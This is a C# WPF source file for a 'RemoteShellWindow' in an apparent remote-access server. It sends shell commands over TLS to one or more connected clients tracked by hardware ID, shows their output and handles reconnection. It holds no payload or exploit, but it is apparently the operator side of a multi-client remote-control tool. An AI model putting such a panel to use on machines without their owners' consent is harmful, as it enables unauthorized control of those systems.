using System.Windows;
using System.Windows.Input;
using DevExpress.Xpf.Core;
using SeroServer.Data;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class RemoteShellWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly List<ConnectedClient> _clients;
    private readonly HashSet<string> _hwids;
    private System.Windows.Threading.DispatcherTimer? _reconnectTimer;
    private int _reconnectCountdown;

    public RemoteShellWindow(TlsServer server, List<ConnectedClient> clients)
    {
        InitializeComponent();
        WindowResizer.Enable(this);

        _server = server;
        _clients = clients;
        _hwids = new HashSet<string>(clients.Select(c => c.Hwid).Where(h => !string.IsNullOrEmpty(h)));

        if (clients.Count == 1)
            TxtTitle.Text = $"— {clients[0].Id}";
        else
            TxtTitle.Text = $"— {clients.Count} clients";

        _server.ShellOutputReceived += OnShellOutput;
        _server.ClientDisconnected  += OnClientDisconnected;
        _server.ClientConnected     += OnClientConnected;
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _reconnectTimer?.Stop();
            _server.ShellOutputReceived -= OnShellOutput;
            _server.ClientDisconnected  -= OnClientDisconnected;
            _server.ClientConnected     -= OnClientConnected;
            Lang.LanguageChanged -= ApplyLanguage;
        };
    }

    private void ApplyLanguage() { Title = Lang.Get("FEAT_REMOTE_SHELL"); }

    private void OnClientDisconnected(ConnectedClient c)
    {
        if (!_clients.Any(x => x.Id == c.Id)) return;
        Dispatcher.BeginInvoke(() =>
        {
            _clients.RemoveAll(x => x.Id == c.Id);
            if (_clients.Count > 0) return; // still have other clients connected

            _reconnectCountdown = 60;
            TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
            ReconnectOverlay.Visibility = Visibility.Visible;
            ServerWindow.ReportGlobalActivity("⚡ Connection lost", "Shell", "failed");

            _reconnectTimer?.Stop();
            _reconnectTimer = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
            _reconnectTimer.Tick += (_, _) =>
            {
                _reconnectCountdown--;
                TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
                if (_reconnectCountdown <= 0)
                {
                    _reconnectTimer.Stop();
                    ServerWindow.ReportGlobalActivity("✗ Reconnect timeout", "Shell", "failed");
                    Close();
                }
            };
            _reconnectTimer.Start();
        });
    }

    private void OnClientConnected(ConnectedClient c)
    {
        if (!_hwids.Contains(c.Hwid)) return;
        Dispatcher.BeginInvoke(() =>
        {
            _clients.Add(c);

            // Hide overlay, cancel timer
            _reconnectTimer?.Stop();
            ReconnectOverlay.Visibility = Visibility.Collapsed;

            TxtOutput.AppendText("\n--- Session reconnected ---");
            OutputScroller.ScrollToEnd();
            ServerWindow.ReportGlobalActivity("✓ Reconnected (Shell)", c.Id, "complete");
        });
    }

    private void OnShellOutput(string clientId, string output)
    {
        // Only show output from our target clients
        if (!_clients.Any(c => c.Id == clientId)) return;

        Dispatcher.BeginInvoke(() =>
        {
            var prefix = _clients.Count > 1 ? $"[{clientId}] " : "";
            if (TxtOutput.Text == "Type a command and press Enter...")
                TxtOutput.Text = "";
            TxtOutput.AppendText($"\n{prefix}{output}");
            if (TxtOutput.Text.Length > 50000)
                TxtOutput.Text = TxtOutput.Text[^50000..];
            OutputScroller.ScrollToEnd();
        });
    }

    private async void Send_Click(object sender, RoutedEventArgs e)
    {
        try { await SendCommand(); } catch { }
    }

    private async void TxtCommand_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.Key == Key.Enter)
            try { await SendCommand(); } catch { }
    }

    private async Task SendCommand()
    {
        var cmd = TxtCommand.Text.Trim();
        if (string.IsNullOrEmpty(cmd)) return;

        if (TxtOutput.Text == "Type a command and press Enter...")
            TxtOutput.Text = "";
        TxtOutput.AppendText($"\n> {cmd}");
        TxtCommand.Clear();
        ServerWindow.ReportGlobalActivity("Remote command", cmd.Length > 20 ? cmd[..20] + "..." : cmd, "running");

        var packet = new Packet
        {
            Type = PacketType.RemoteShell,
            Data = cmd
        };

        foreach (var client in _clients)
        {
            await _server.SendToClient(client.Id, packet);
        }

        OutputScroller.ScrollToEnd();
    }

    private void Close_Click(object sender, RoutedEventArgs e) => Close();
}
